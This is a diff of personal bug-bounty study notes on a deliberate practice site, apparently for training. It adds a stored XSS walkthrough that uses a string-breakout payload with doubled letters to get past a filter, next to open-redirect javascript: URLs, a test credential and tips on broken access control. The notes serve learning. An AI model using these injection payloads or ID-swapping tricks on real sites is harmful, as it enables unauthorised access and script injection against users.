@@ -436,7 +436,8 @@ https://www.bugbountytraining.com/fastfoodhackings/go.php?returnUrl=javascript:a
 https://www.bugbountytraining.com/fastfoodhackings/go.php?returnUrl=javascript:alert(2);//&type=1
 /fastfoodhackings/api/admin.php?adToken= 
  {"username":"test-zseano","password":"SuP3RG0OdP@ssw0rd!"}
-
+book.php?promoCode=UKONLY
+var promotion = 'UKONLY';aalertlert(2);var x='a';   payload is {<UKONLY';aalertlert(2);var x='a>}
 
 
 #Perform HTML injection in url field && Escalate to XSS
@@ -467,6 +468,14 @@ https://www.bugbountytraining.com/fastfoodhackings/index.php?act=-->logintesttes
 - paste the URL dir in the search bar witth scope website and load 
 // you can also use the target to check for other directories an endpoint is leading to e.g (f=) then search 
 // Regex in burp: {\?.*?=}
+
 #BAC 
-[+] when you get to loginn with any credential, try load anotther user by changing ID 
--
+[+] when you get to login with any credential, try load anotther user by changing ID 
+
+#Stored XSS
+[+]load URl  /book.php?promoCode=UKONLY
+-input a test word in the url and check where it reflects on the source code 
+- for the above site, it redirects and reflects in the source code of the menu.php path
+- input payload on book.php?promoCode=<UKONLY';aalertlert(2);var x='a}
+- load the Menu page and you should have a stored XSS 
+
